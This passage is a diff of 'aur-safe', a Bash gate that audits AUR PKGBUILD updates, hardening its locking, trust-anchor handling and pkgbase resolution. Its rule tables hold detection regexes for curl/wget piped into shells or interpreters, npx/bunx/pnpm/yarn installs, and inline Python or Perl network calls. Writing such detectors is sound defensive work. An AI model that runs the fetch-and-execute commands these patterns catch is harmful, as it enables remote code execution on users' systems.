@@ -4,9 +4,9 @@
 #
 # Design: yay/paru keep a per-package git clone of the AUR repo. origin/master is
 # the candidate update; the last-known-good state is aur-safe's OWN accepted ref
-# (~/.cache/aur-safe/accepted/<pkgbase>), seeded from the helper HEAD on first
-# contact and advanced only after a build the gate audited AND pacman confirms
-# installed. We fetch, diff accepted..origin/master, and deterministically
+# (~/.cache/aur-safe/accepted/<pkgbase>), created only after a candidate is
+# audited AND pacman confirms it installed. First contact requires whole-candidate
+# review; later gates diff accepted..origin/master and deterministically
 # classify the ADDED lines. The LLM cannot override hard/review/audit-unavailable
 # results; it is advisory via `explain` and optionally verifies only boring-edge
 # diffs.
@@ -31,7 +31,7 @@
 # Intended to be called by a shell function that shadows yay/paru. This script is
 # NOT wired up — see the suggested wrapper printed by `aur-safe wrapper`.
 #
-# Exit codes: 0 clean | 1 hard-fail | 2 review-only | 3 usage/env error
+# Exit codes: 0 clean | 1 block (risk or audit unavailable) | 2 review | 3 usage/env error
 
 set -uo pipefail
 
@@ -39,8 +39,8 @@ set -uo pipefail
 # diff.colorWords / diff.wordDiff (word-oriented output, no + prefixes → empty
 # `added` → hard rules find nothing), diff.noprefix (no `b/` prefix → file
 # trackers never match), diff.mnemonicPrefix, and textconv filters (arbitrary
-# code exec on `git show`) would break the entire diff pipeline and the new
-# @@ hunk-header label recovery. Pointing both config files at /dev/null makes
+# code exec on `git show`) would break the entire diff/full-candidate parser.
+# Pointing both config files at /dev/null makes
 # every git diff/show/rev-parse in the trust path deterministic regardless of
 # the user's ~/.gitconfig. Per-command -c flags are an alternative but the
 # export is a single chokepoint covering all call sites.
@@ -130,9 +130,10 @@ add_rule install-hook-func     '(function[[:space:]]+)?(post|pre)_(install|upgra
 # making non-installer subcommands (e.g. `npm init`) match.
 add_rule npm                   'npm([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(install|i|ci|add|run|exec)([[:space:];|&]|$)'
 add_rule npx                   'npx([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+[[:alnum:]_@./-]'
-add_rule pnpm                  'pnpm([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(install|i|add|ci|run)([[:space:];|&]|$)'
+add_rule bunx                  'bunx([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+[[:alnum:]_@./-]'
+add_rule pnpm                  'pnpm([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(install|i|add|ci|run|exec|dlx)([[:space:];|&]|$)'
 add_rule bun                   'bun([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(add|x|install)([[:space:];|&]|$)'
-add_rule yarn                  'yarn([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(add|install)([[:space:];|&]|$)'
+add_rule yarn                  'yarn([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+(add|install|exec|dlx)([[:space:];|&]|$)'
 # network → any interpreter, incl. 'sudo <interp>' (not just sh/bash)
 add_rule pipe-to-interpreter   '(curl|wget|fetch)[^|;&]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|fish|python[0-9.]*|node|ruby|perl[0-9.]*)'
 # inline exec of a fetched string: bash -c "$(curl ...)" — requires command
@@ -162,12 +163,15 @@ add_review() { REVIEW_NAMES+=("$1"); REVIEW_PATTERNS+=("$2"); }
 
 add_review hex-escape          '\\x[0-9a-fA-F]{2}'
 add_review octal-escape        '\\[0-7]{3}'
-add_review pip                 'pip[[:space:]]+(install|download)'
+add_review pip                 '(pip[0-9.]*|python[0-9.]*[[:space:]]+-m[[:space:]]+pip)([[:space:]]+-[^[:space:]]+)*[[:space:]]+(install|download)([[:space:];|&]|$)'
 add_review gem                 'gem[[:space:]]+install'
 add_review cargo-install       'cargo[[:space:]]+install'
 add_review go-install          'go[[:space:]]+install'
-# inline network in non-shell interpreters (rare in legit PKGBUILDs)
-add_review python-inline-net   'python[23]?[[:space:]]+-c.*urllib|python[23]?[[:space:]]+-c.*urlretrieve|python[23]?[[:space:]]+-c.*requests\.|perl[[:space:]]+(-e|-M)[[:space:]]*(HTTP::|LWP|Net::)'
+# Added inline Python is executable build logic regardless of import spelling;
+# generic review avoids an alias/raw-socket name chase. Perl remains net-shaped
+# because `perl -e` is common in legitimate build transforms.
+add_review python-inline       'python[0-9.]*([[:space:]]+-[^[:space:]]+)*[[:space:]]+-c([[:space:]]|$)'
+add_review perl-inline-net     'perl[[:space:]]+(-e|-M)[[:space:]]*(HTTP::|LWP|Net::)'
 
 ###############################################################################
 # helpers
@@ -190,25 +194,105 @@ fi
 log()   { printf '%s\n' "$*" >&2; }
 die()   { log "$(c_red "error:") $*"; exit 3; }
 
+# AUR package-name grammar, tightened for use as a path component. AUR names do
+# not begin with '.', so reject '.', '..', '.git', and every hidden/traversal
+# shape even though the broader character set permits dots (Finding R).
+_valid_pkg_name() {
+  [[ "$1" =~ ^[a-z0-9@._+-]+$ && "$1" != .* ]]
+}
+
+# Replace a one-line state record atomically in its destination directory.
+# Trust-anchor/staged writes must never report success after a partial or failed
+# write: corruption must block rather than lose the audited commit identity.
+# Callers propagate failure and stop the helper.
+_atomic_write_record() {
+  local dest="$1" record="$2" tmp
+  tmp=$(mktemp "${dest}.tmp.XXXXXX") || return 1
+  if ! printf '%s\n' "$record" >"$tmp" || ! mv -f "$tmp" "$dest"; then
+    rm -f "$tmp"
+    return 1
+  fi
+}
+
+# Serialize the gate→helper→accept transaction (Finding L). The generated
+# wrapper holds this lock across all three phases and exports
+# AUR_SAFE_LOCK_HELD=1; direct `gate`/`accept` calls acquire it themselves.
+# Locking only cmd_gate and cmd_accept independently is insufficient because a
+# second gate could overwrite staged/manifest state while the helper builds.
+STATE_LOCK_OWNED=0
+_acquire_state_lock() {
+  command -v flock >/dev/null || { log "$(c_red "BLOCK") flock is required for state locking"; return 1; }
+  if [[ "${AUR_SAFE_LOCK_HELD:-}" == 1 ]]; then
+    # Do not trust the environment claim alone: the generated wrapper passes
+    # the actually locked fd 9 through exec. A spoofed variable without that
+    # inherited lock must fail closed.
+    if { true >&9; } 2>/dev/null && flock -n 9; then
+      return 0
+    fi
+    log "$(c_red "BLOCK") AUR_SAFE_LOCK_HELD set without inherited lock fd"
+    return 1
+  fi
+  exec 9>"$STATE_DIR/run.lock" || return 1
+  if ! flock 9; then
+    exec 9>&-
+    return 1
+  fi
+  STATE_LOCK_OWNED=1
+}
+
+_release_state_lock() {
+  (( STATE_LOCK_OWNED )) || return 0
+  flock -u 9 2>/dev/null || true
+  exec 9>&-
+  STATE_LOCK_OWNED=0
+}
+
+# Long-lived clone/review temp roots are registered so Ctrl-C/TERM cannot leak
+# them. Normal-path explicit cleanup remains for locality; EXIT cleanup is the
+# crash/signal backstop (Finding L8).
+TEMP_PATHS=()
+_register_temp_path() { TEMP_PATHS+=("$1"); }
+_cleanup_temp_paths() {
+  local path
+  for path in "${TEMP_PATHS[@]}"; do
+    [[ -n "$path" ]] && rm -rf -- "$path"
+  done
+}
+_on_signal() {
+  local rc="$1"
+  trap - INT TERM
+  exit "$rc"
+}
+trap _cleanup_temp_paths EXIT
+trap '_on_signal 130' INT
+trap '_on_signal 143' TERM
+
 # Find a package's git clone in any configured cache. Prints dir, returns 1 if
 # not found.
 find_pkg_dir() {
-  local pkg="$1" base d
-  # fast path: exact dir-name match (pkgname == pkgbase)
+  local pkg="$1" base pkgbase dir
+  # Fast path: exact dir-name match (pkgname == pkgbase).
   for base in "$YAY_CACHE" "$PARU_CACHE"; do
     [[ -d "$base/$pkg/.git" ]] && { printf '%s/%s\n' "$base" "$pkg"; return 0; }
   done
-  # slow path: split packages where pkgname != pkgbase. yay -Qua reports the
-  # pkgname, but the cache dir is keyed by pkgbase. Scan .SRCINFO for a match.
+  # Split packages need pkgname→pkgbase resolution. Never discover that mapping
+  # by scanning attacker-authored cached .SRCINFO files: another package could
+  # claim this pkgname and redirect the gate to the wrong repo. Resolve through
+  # AUR RPC, then inspect only the exact pkgbase directory; failure safely falls
+  # through to missing_cache_gate.
+  pkgbase=$(_resolve_pkgbase "$pkg") || return 1
+  [[ "$pkgbase" != "$pkg" ]] || return 1
   for base in "$YAY_CACHE" "$PARU_CACHE"; do
-    [[ -d "$base" ]] || continue
-    for d in "$base"/*/; do
-      [[ -f "${d}.SRCINFO" ]] || continue
-      if awk -v p="$pkg" '$1=="pkgname" && $3==p { f=1 } END { exit !f }' "${d}.SRCINFO" 2>/dev/null; then
-        printf '%s\n' "${d%/}"
-        return 0
-      fi
-    done
+    dir="$base/$pkgbase"
+    [[ -d "$dir/.git" && -f "$dir/.SRCINFO" ]] || continue
+    if awk -v p="$pkg" -v b="$pkgbase" '
+        $1=="pkgbase" && $3==b { base_ok=1 }
+        $1=="pkgname" && $3==p { name_ok=1 }
+        END { exit !(base_ok && name_ok) }
+      ' "$dir/.SRCINFO" 2>/dev/null; then
+      printf '%s\n' "$dir"
+      return 0
+    fi
   done
   return 1
 }
@@ -260,7 +344,7 @@ source_domains() {
   # opening line, clear it after a line containing ')'. A naive line-anchored
   # grep misses URLs on continuation lines (the host-swap attack surface).
   git -C "$dir" show "${ref}:PKGBUILD" 2>/dev/null \
-    | awk '/^[[:space:]]*source/ { in_src=1 } in_src { print; if (/\)/) in_src=0 }' \
+    | awk '/^[[:space:]]*source(_[[:alnum:]_]+)?=\(/ { in_src=1 } in_src { print; if (/\)/) in_src=0 }' \
     | grep -aoE '://[a-zA-Z0-9._-]+' \
     | sed 's#^://##' | tr '[:upper:]' '[:lower:]' | sort -u
 }
@@ -307,13 +391,18 @@ _source_line_nonascii() {
 # Files changed with a given status filter (A=added, M=modified), whose basename
 # ends with the given literal suffix. Uses --name-only (handles spaces safely).
 files_with_status() {
-  local filter="$1" suffix="$2" dir="$3" base="$4"
-  git -C "$dir" diff --name-only --diff-filter="$filter" \
-    "${base}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null \
-    | awk -v sfx="$suffix" '{
-        n=split($0,a,"/"); f=a[n]; ls=length(sfx);
-        if (substr(f,length(f)-ls+1)==sfx) print $0
-      }'
+  local filter="$1" suffix="$2" dir="$3" base="$4" tmp path filename
+  tmp=$(mktemp -t aur-safe-files.XXXXXX) || return 1
+  if ! git -C "$dir" diff --name-only -z --diff-filter="$filter" \
+      "${base}..origin/${AUR_REMOTE_BRANCH}" >"$tmp" 2>/dev/null; then
+    rm -f "$tmp"
+    return 1
+  fi
+  while IFS= read -r -d '' path; do
+    filename="${path##*/}"
+    [[ "$filename" == *"$suffix" ]] && printf '%q\n' "$path"
+  done <"$tmp"
+  rm -f "$tmp"
 }
 
 _boring_added_line_class() {
@@ -451,125 +540,175 @@ _boring_added_line_class() {
   return 2
 }
 
+# Prove an added line is a member of a specific multiline PKGBUILD array.
+# One complete-candidate state machine serves every array type so the
+# security-sensitive parsers cannot drift. The opener MUST end after `(`:
+# a prefix match on `depends=()` latches array state past its inline closer and
+# can misclassify a later executable quoted token as inert metadata.
+_pkgbuild_array_member_added_line() {
+  local dir="$1" wanted="$3" opener="$4" want_file rc
+  # Parse the complete candidate PKGBUILD, not diff hunk state. A hunk header
+  # can describe a REMOVED multiline opener; trusting it after the candidate
+  # changed to `depends=()` latches context and can hide a following executable
+  # quoted token. Full-file state has no old/new ambiguity and also handles
+  # members too deep for ordinary hunk context.
+  want_file=$(mktemp -t aur-safe-array-want.XXXXXX) || return 1
+  _register_temp_path "$want_file"
+  printf '%s\n' "$wanted" >"$want_file" || { rm -f "$want_file"; return 1; }
+  git -C "$dir" show "origin/${AUR_REMOTE_BRANCH}:PKGBUILD" 2>/dev/null \
+    | awk -v want_file="$want_file" -v opener="$opener" '
+        function closes_array(s,    i,n,c,state,prev) {
+          n=length(s); state=0
+          for (i=1; i<=n; i++) {
+            c=substr(s,i,1); prev=(i>1 ? substr(s,i-1,1) : "")
+            if (state == 0) {
+              if (c == "#" && (i == 1 || prev ~ /[[:space:]]/)) break
+              if (c == "\\") { i++; continue }
+              if (c == SQ) state=1
+              else if (c == "\"") state=2
+              else if (c == "`") state=3
+              else if (c == ")") return 1
+            } else if (state == 1) {
+              if (c == SQ) state=0
+            } else if (state == 2) {
+              if (c == "\\") i++
+              else if (c == "\"") state=0
+            } else {
+              if (c == "\\") i++
+              else if (c == "`") state=0
+            }
+          }
+          return 0
+        }
+        function ambiguous(s,    i,n,c,state,prev) {
+          # Conservative lexical screen, not a Bash evaluator. It understands
+          # per-line quote/comment escapes solely to detect constructs spanning
+          # lines; heredocs are rejected outright.
+          if (s ~ /<<-?[[:space:]]*[^<]/) return 1
+          n=length(s); state=0
+          for (i=1; i<=n; i++) {
+            c=substr(s,i,1); prev=(i>1 ? substr(s,i-1,1) : "")
+            if (state == 0) {
+              if (c == "#" && (i == 1 || prev ~ /[[:space:]]/)) break
+              if (c == "\\") { if (i == n) return 1; i++; continue }
+              if (c == SQ) state=1
+              else if (c == "\"") state=2
+              else if (c == "`") state=3
+            } else if (state == 1) {
+              if (c == SQ) state=0
+            } else if (state == 2) {
+              if (c == "\\") { if (i == n) return 1; i++; continue }
+              if (c == "\"") state=0
+              else if (c == "`") return 1
+            } else {
+              if (c == "\\") { if (i == n) return 1; i++; continue }
+              if (c == "`") state=0
+            }
+          }
+          return state != 0
+        }
+        BEGIN {
+          SQ=sprintf("%c",39)
+          if ((getline wanted < want_file) <= 0) exit 2
+          close(want_file)
+        }
+        {
+          # Disable contextual auto-clear if a preceding line can carry shell
+          # lexical state into what merely LOOKS like an array opener.
+          if (ambiguous($0)) unsafe=1
+          if ($0 ~ opener) in_array=1
+          if ($0 == wanted) {
+            if (in_array) {
+              found=1
+              if (unsafe) unsafe_found=1
+            } else outside=1
+          }
+          # Bash arrays may close as `) # comment`, `) && ...`, or on the final
+          # member line (`"value")`). Find only an unquoted/uncommented `)`;
+          # missing a real closer can latch checksum context into validpgpkeys.
+          if (in_array && closes_array($0)) in_array=0
+        }
+        # Candidates are keyed by raw text. Every candidate-file occurrence
+        # must be in scope so a safe duplicate cannot mask an executable twin.
+        END { exit (found && !outside && !unsafe_found) ? 0 : 1 }
+      '
+  rc=$?
+  rm -f "$want_file"
+  return "$rc"
+}
+
 _pkgbuild_optdepends_added_line() {
   local dir="$1" base_ref="$2" wanted="$3"
   # PKGBUILD is sourced shell. Only literal single-quoted optdepends entries are
   # metadata-safe here; unquoted/double-quoted entries can perform expansion.
   grep -Eq "^[[:space:]]*'[^']+'[[:space:]]*$" <<<"$wanted" 2>/dev/null || return 1
-  git -C "$dir" --no-pager diff "${base_ref}..origin/${AUR_REMOTE_BRANCH}" -- \
-    "${EXCLUDE_PATHS[@]}" 2>/dev/null \
-    | awk -v wanted="$wanted" '
-        /^diff --git / { file=""; in_opt=0; next }
-        /^\+\+\+ b\// {
-          file=substr($0, 7)
-          in_opt=0
-          next
-        }
-        /^@@ / {
-          # Carry the enclosing optdepends=( opener from the @@ header label
-          # into the hunk (same fix as _pkgbuild_checksum_array_line): when the
-          # changed entry is deep enough to land in a separate hunk, git puts
-          # the opener only in the @@ ... @@ header label, not the body.
-          in_opt=0
-          hdr=$0; sub(/^@@ [^@]+@@[[:space:]]*/, "", hdr)
-          if (file == "PKGBUILD" && hdr ~ /^[[:space:]]*optdepends=\(/) in_opt=1
-          next
-        }
-        /^\+\+\+/ || /^---/ { next }
-        /^[ +]/ {
-          marker=substr($0, 1, 1)
-          text=substr($0, 2)
-          if (file == "PKGBUILD" && text ~ /^[[:space:]]*optdepends=\(/) {
-            in_opt=1
-          }
-          if (marker == "+" && file == "PKGBUILD" && in_opt && text == wanted) {
-            found=1
-            exit
-          }
-          if (file == "PKGBUILD" && in_opt && text ~ /^[[:space:]]*\)[[:space:]]*$/) {
-            in_opt=0
-          }
-        }
-        END { exit found ? 0 : 1 }
-      '
+  _pkgbuild_array_member_added_line "$dir" "$base_ref" "$wanted" \
+    '^[[:space:]]*optdepends=\\([[:space:]]*$'
 }
 
 # Verify a bare hex/SKIP added line appears within a checksum array in the
-# PKGBUILD diff (finding E). Without this check, a standalone hex fingerprint
-# or SKIP token added to validpgpkeys=() or any non-checksum context would
-# match the bare-hex fast-path and classify as boring, silently auto-clearing
-# a trust-anchor change. This follows the same pattern as
-# _pkgbuild_optdepends_added_line: parse the full diff, track array context.
+# PKGBUILD diff (finding E). Without this check, a standalone fingerprint or
+# SKIP in validpgpkeys=() could auto-clear as a checksum.
 _pkgbuild_checksum_array_line() {
   local dir="$1" base_ref="$2" wanted="$3"
-  # Only handle lines that look like bare hex/SKIP tokens.
   grep -Eq '^[[:space:]]*["'"'"']?(SKIP|[A-Fa-f0-9]{16,})["'"'"']?[[:space:]]*\\?[[:space:]]*$' <<<"$wanted" 2>/dev/null || return 1
-  git -C "$dir" --no-pager diff "${base_ref}..origin/${AUR_REMOTE_BRANCH}" -- \
-    "${EXCLUDE_PATHS[@]}" 2>/dev/null \
-    | awk -v wanted="$wanted" '
-        /^diff --git / { file=""; in_cs=0; next }
-        /^\+\+\+ b\// {
-          file=substr($0, 7)
-          in_cs=0
-          next
-        }
-        /^@@ / {
-          # git emits the enclosing section as a trailing label after the
-          # 2nd @@ (e.g. @@ -33,7 +33,7 @@ sha256sums=( ). When the array
-          # opener is in the header label and NOT the hunk body — which happens
-          # whenever the changed element is far enough below the opener to land
-          # in a separate hunk — carry that opener into the hunk so the deep
-          # element still matches. Same opener regex as the body-line check.
-          in_cs=0
-          hdr=$0; sub(/^@@ [^@]+@@[[:space:]]*/, "", hdr)
-          if (file == "PKGBUILD" && hdr ~ /^[[:space:]]*(md5|sha[0-9]+|b2)sums(_[[:alnum:]_]+)?=\(/) in_cs=1
-          next
-        }
-        /^\+\+\+/ || /^---/ { next }
-        /^[ +]/ {
-          marker=substr($0, 1, 1)
-          text=substr($0, 2)
-          # Enter checksum array on (md5|sha...|b2)sums(_...)?=(
-          # Only from added (+) or context ( ) lines — a removed checksum
-          # array header does not grant context for new hex tokens elsewhere.
-          if (file == "PKGBUILD" && marker != "-" && text ~ /^[[:space:]]*(md5|sha[0-9]+|b2)sums(_[[:alnum:]_]+)?=\(/) {
-            in_cs=1
-          }
-          if (marker == "+" && file == "PKGBUILD" && in_cs && text == wanted) {
-            found=1
-            exit
-          }
-          if (file == "PKGBUILD" && in_cs && text ~ /^[[:space:]]*\)[[:space:]]*$/) {
-            in_cs=0
-          }
-        }
-        END { exit found ? 0 : 1 }
-      '
+  _pkgbuild_array_member_added_line "$dir" "$base_ref" "$wanted" \
+    '^[[:space:]]*(md5|sha[0-9]+|b2)sums(_[[:alnum:]_]+)?=\\([[:space:]]*$'
 }
 
-_srcinfo_repo_dep_added_line() {
-  local dir="$1" base_ref="$2" line="$3" dep spec members
-  grep -Eq '^[[:space:]]*(depends|makedepends|checkdepends)[[:space:]]+=[[:space:]]+.+' <<<"$line" 2>/dev/null || return 1
-  spec=$(sed -E 's/^[[:space:]]*(depends|makedepends|checkdepends)[[:space:]]+=[[:space:]]+//; s/[[:space:]].*$//' <<<"$line")
-  _pacman_dep_satisfied "$spec" && return 0
+_pkgbuild_source_filename_added_line() {
+  local dir="$1" base_ref="$2" wanted="$3"
+  # Literal local filenames in multiline source arrays are inert, but only
+  # after proving array context. A global filename regex would misclassify a
+  # quoted top-level command, the same class as the empty-array latch bug.
+  grep -Eq '^[[:space:]]*["'"'"'][-A-Za-z0-9@._+/]+["'"'"'][[:space:]]*$' \
+    <<<"$wanted" 2>/dev/null || return 1
+  _pkgbuild_array_member_added_line "$dir" "$base_ref" "$wanted" \
+    '^[[:space:]]*source(_[[:alnum:]_]+)?=\\([[:space:]]*$'
+}
+
+_trusted_dependency_spec() {
+  local dir="$1" spec="$2" dep members
   dep=$(sed -E 's/[<>=].*$//' <<<"$spec")
   [[ "$dep" =~ ^[A-Za-z0-9@._+-]+$ ]] || return 1
+  _pacman_dep_satisfied "$spec" && return 0
   _pacman_sync_info "$dep" && return 0
   # Intra-pkgbase dep: the name is this pkgbase itself or a sibling pkgname
   # member declared at the new tip. Such a dep cannot pull in unaudited code
-  # from outside the package under review (the external-AUR-dep guard above
-  # remains intact for every other name). Real shape: split nvidia-580xx-utils,
-  # where opencl-nvidia-580xx depends on nvidia-580xx-utils (a sibling member)
-  # with a version pinned to the pkgbase's pkgver. pkgbase= and pkgname= are
-  # column-0 section headers; awk default-FS splits "<key>\t=\t<val>" into
-  # $1/$2/$3 (same idiom find_pkg_dir relies on, also tolerant of the
-  # space-indented .SRCINFO edge case). See design-ledger "boring-diff gate".
+  # from outside the package under review (the external-AUR-dep guard remains
+  # intact for every other name). See design-ledger "boring-diff gate".
   members=$(git -C "$dir" show "origin/${AUR_REMOTE_BRANCH}:.SRCINFO" 2>/dev/null) || return 1
   awk -v d="$dep" '
     $1=="pkgbase" && $3==d { f=1 }
     $1=="pkgname" && $3==d { f=1 }
     END { exit !f }
   ' <<<"$members"
+}
+
+_srcinfo_repo_dep_added_line() {
+  local dir="$1" line="$3" spec
+  grep -Eq '^[[:space:]]*(depends|makedepends|checkdepends)[[:space:]]+=[[:space:]]+.+' <<<"$line" 2>/dev/null || return 1
+  spec=$(sed -E 's/^[[:space:]]*(depends|makedepends|checkdepends)[[:space:]]+=[[:space:]]+//; s/[[:space:]].*$//' <<<"$line")
+  _trusted_dependency_spec "$dir" "$spec"
+}
+
+_pkgbuild_repo_dep_added_line() {
+  local dir="$1" base_ref="$2" wanted="$3" spec srcinfo
+  # PKGBUILD is sourced shell. Restrict this exception to a literal
+  # single-quoted array member: double quotes, bare words, and substitutions
+  # stay reviewable. Require the generated .SRCINFO mirror as a second
+  # structural check, then apply the same installed/sync-db/intra-pkgbase trust
+  # policy as .SRCINFO dependencies.
+  grep -Eq "^[[:space:]]*'[^']+'[[:space:]]*$" <<<"$wanted" 2>/dev/null || return 1
+  spec=$(sed -E "s/^[[:space:]]*'([^']+)'[[:space:]]*$/\\1/" <<<"$wanted")
+  srcinfo=$(git -C "$dir" show "origin/${AUR_REMOTE_BRANCH}:.SRCINFO" 2>/dev/null) || return 1
+  awk -v s="$spec" '
+    ($1=="depends" || $1=="makedepends" || $1=="checkdepends") && $2=="=" && $3==s { found=1 }
+    END { exit !found }
+  ' <<<"$srcinfo" || return 1
+  _trusted_dependency_spec "$dir" "$spec" || return 1
+  _pkgbuild_array_member_added_line "$dir" "$base_ref" "$wanted" \
+    '^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)?=\\([[:space:]]*$'
 }
 
 # Resolve review-detail candidates in a SINGLE git diff pass. The per-line
@@ -749,16 +888,33 @@ EOF
   return 1
 }
 
-stash_flag() {
-  # Persist the offending diff so `explain` can read it.
-  local pkg="$1" dir="$2" base="$3"
-  local context="${4:-review}"
+_stash_content() {
+  local pkg="$1" context="$2" content="$3"
   local flagfile="$STATE_DIR/flag.${pkg}.diff"
-  git -C "$dir" --no-pager diff "${base}..origin/${AUR_REMOTE_BRANCH}" -- \
-    "${EXCLUDE_PATHS[@]}" >"$flagfile" 2>/dev/null || true
-  printf '%s\n' "$context" >"$STATE_DIR/flag.${pkg}.context" 2>/dev/null || true
-  ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" 2>/dev/null || true
-  printf '%s\n' "$pkg" >"$STATE_DIR/last-flag.pkg"
+  if ! _atomic_write_record "$flagfile" "$content" \
+      || ! _atomic_write_record "$STATE_DIR/flag.${pkg}.context" "$context" \
+      || ! ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" \
+      || ! _atomic_write_record "$STATE_DIR/last-flag.pkg" "$pkg"; then
+    rm -f "$flagfile" "$STATE_DIR/flag.${pkg}.context" "$STATE_DIR/last-flag.diff"
+    return 1
+  fi
+}
+
+stash_flag() {
+  # Persist the offending diff atomically so `view`/`explain` can never show a
+  # stale prior diff while the gate stages a newer commit.
+  local pkg="$1" dir="$2" base="$3" context="${4:-review}"
+  local flagfile="$STATE_DIR/flag.${pkg}.diff" tmp
+  tmp=$(mktemp "${flagfile}.tmp.XXXXXX") || return 1
+  if ! git -C "$dir" --no-pager diff "${base}..origin/${AUR_REMOTE_BRANCH}" -- \
+      "${EXCLUDE_PATHS[@]}" >"$tmp" 2>/dev/null \
+      || ! mv -f "$tmp" "$flagfile" \
+      || ! _atomic_write_record "$STATE_DIR/flag.${pkg}.context" "$context" \
+      || ! ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" \
+      || ! _atomic_write_record "$STATE_DIR/last-flag.pkg" "$pkg"; then
+    rm -f "$tmp" "$flagfile" "$STATE_DIR/flag.${pkg}.context" "$STATE_DIR/last-flag.diff"
+    return 1
+  fi
 }
 
 # GC old flag diffs so STATE_DIR doesn't grow unbounded.
@@ -770,35 +926,60 @@ gc_state() {
   find "$STAGED_DIR" -maxdepth 1 -type f -mtime +7 -delete 2>/dev/null || true
 }
 
-# Resolve the accepted (trust-anchor) ref for a pkgbase. Prints the SHA; seeds
-# from the helper-cache HEAD on first contact and persists it, so the anchor is
-# frozen at first contact — the core fix for finding 1.2: a later manipulated
-# or stale helper HEAD can no longer silently move the diff baseline.
+# Resolve an existing accepted (trust-anchor) ref for a pkgbase. First contact
+# deliberately has NO implicit HEAD seed: helper HEAD may have advanced after an
+# aborted/uninstalled build. check_pkg routes missing anchors through mandatory
+# whole-candidate review, and `accept` creates the first confirmed anchor.
 accepted_ref() {
-  local dir="$1" pkgbase="$2" sha url
-  local f="$ACCEPTED_DIR/$pkgbase"
-  if [[ -s "$f" ]]; then
-    awk -F'\t' '{print $1; exit}' "$f"
-    return 0
-  fi
-  sha=$(git -C "$dir" rev-parse HEAD 2>/dev/null) || return 1
-  url=$(git -C "$dir" config --get remote.origin.url 2>/dev/null || true)
-  printf '%s\t%s\t%s\n' "$sha" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$url" >"$f" 2>/dev/null || true
+  local dir="$1" pkgbase="$2" sha f
+  f="$ACCEPTED_DIR/$pkgbase"
+  [[ -s "$f" ]] || return 1
+  sha=$(awk -F'\t' '{print $1; exit}' "$f")
+  [[ "$sha" =~ ^[0-9a-f]{40}$ ]] || return 1
+  git -C "$dir" cat-file -e "${sha}^{commit}" 2>/dev/null || return 1
   printf '%s\n' "$sha"
 }
 
 # Write a ref file (staged or accepted) recording origin/master tip + provenance:
 # <sha>\t<iso-utc>\t<origin-url>. Enables post-mortem forensics.
 write_ref() {
-  local dir="$1" f="$2" url
+  local dir="$1" f="$2" sha url
+  sha=$(git -C "$dir" rev-parse --verify "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null) || return 1
+  [[ "$sha" =~ ^[0-9a-f]{40}$ ]] || return 1
   url=$(git -C "$dir" config --get remote.origin.url 2>/dev/null || true)
-  printf '%s\t%s\t%s\n' \
-    "$(git -C "$dir" rev-parse "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null)" \
-    "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$url" >"$f"
+  _atomic_write_record "$f" "$sha"$'\t'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"$'\t'"$url"
 }
 
 # Overridable pacman-query seam (for selftest). Prints "<name> <ver>".
 _pacman_query() { pacman -Q -- "$1" 2>/dev/null; }
+
+# Print one trusted local-database record for an installed package as
+# "name<TAB>version<TAB>pkgbase<TAB>build-epoch<TAB>install-epoch". pacman -Q does not expose
+# pkgbase, but the root-owned local DB does. Binding an installed pkgname back
+# to its actual pkgbase prevents attacker-authored .SRCINFO from claiming an
+# unrelated package such as glibc during staged-ref acceptance (Finding F).
+# Overridable seam for selftest.
+_pacman_local_record() {
+  local pkg="$1" dbpath desc
+  dbpath=$(pacman-conf DBPath 2>/dev/null) || return 1
+  [[ -n "$dbpath" ]] || return 1
+  for desc in "${dbpath%/}"/local/"${pkg}"-*/desc; do
+    [[ -f "$desc" ]] || continue
+    awk -v wanted="$pkg" '
+      $0=="%NAME%"        { getline name; next }
+      $0=="%VERSION%"     { getline version; next }
+      $0=="%BASE%"        { getline base; next }
+      $0=="%BUILDDATE%"   { getline built; next }
+      $0=="%INSTALLDATE%" { getline installed; next }
+      END {
+        if (name != wanted || version == "") exit 1
+        if (base == "") base=name
+        printf "%s\t%s\t%s\t%s\t%s\n", name, version, base, built, installed
+      }
+    ' "$desc" && return 0
+  done
+  return 1
+}
 
 # Overridable pacman sync-db seam (for selftest). Returns 0 when $1 is a known
 # repository package. AUR/unknown deps must stay review because otherwise an AUR
@@ -834,39 +1015,54 @@ _resolve_pkgbase() {
     /"Name"[[:space:]]*:/        { val(); if ($0 == pkg) matched = 1 }
     /"PackageBase"[[:space:]]*:/ { if (matched) { val(); print; exit } }
   ')
-  [[ -n "$base" ]] || return 1
+  _valid_pkg_name "$base" || return 1
   printf '%s\n' "$base"
 }
 
 # Return 0 if a package built from commit $sha (in $dir) is currently installed
-# at exactly that commit's version. Resolves split packages: ANY pkgname at the
-# matching version counts (the PKGBUILD built and its build/install hooks ran).
-# This is the install-confirmation assertion — it prevents advancing the trust
-# anchor for a package whose audited commit didn't actually install.
+# at exactly that commit's version. `$3` is the EXPECTED pkgbase (the trust-anchor
+# key), and optional `$4` is the earliest acceptable pacman install timestamp.
+# Resolves split packages: ANY declared pkgname at the matching version counts,
+# but its root-owned pacman DB record MUST bind back to the expected pkgbase.
+# .SRCINFO is attacker-authored metadata, so it may propose names/version but
+# can no longer make an unrelated installed package confirm this build (Finding
